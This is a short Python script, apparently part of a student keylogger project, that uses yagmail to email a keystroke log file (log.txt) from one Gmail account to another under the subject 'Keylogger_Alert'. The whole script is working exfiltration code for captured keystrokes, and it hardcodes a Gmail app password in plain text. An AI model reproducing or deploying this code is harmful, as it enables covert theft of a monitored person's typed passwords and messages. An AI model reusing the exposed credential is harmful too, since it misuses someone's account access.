import yagmail
password ="prtndxpwmblbfemo"
yag=yagmail.SMTP('deepmachine748@gmail.com',password)
yag.send(to='dachabhagya99@gmail.com',
            subject="Keylogger_Alert",
            contents="PFA",
            attachments="C:/Users/Bunny/OneDrive/Desktop/project/keylogger_update/pythonProject2/log.txt")
print("Email Sent")